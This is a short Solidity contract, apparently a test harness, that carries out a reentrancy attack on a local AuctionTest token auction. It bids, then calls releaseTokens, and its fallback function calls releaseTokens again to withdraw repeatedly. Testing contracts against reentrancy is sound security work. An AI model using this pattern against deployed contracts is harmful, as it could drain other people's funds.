pragma solidity ^0.6.0;

import "./AuctionTest.sol";
import "./CypherpunkCoin.sol";


contract Reentrancy{
    AuctionTest public auction;
    CypherpunkCoin cpc;
    uint256 public constant rightfulCYCAmt = 5;
    uint256 public constant finalPrice = 1000;
    uint256 public balance;

    constructor() public {
        cpc = new CypherpunkCoin("CypherpunkCoin", "CPC");
        auction = new AuctionTest(10000, finalPrice, 50000000, cpc);
    }

    function bid() external{
        auction.commit.value(finalPrice * rightfulCYCAmt)();
        auction.setState();
        auction.releaseTokens();
    }

    //Fallback function
    fallback() external payable{
        auction.releaseTokens();
    }


        
}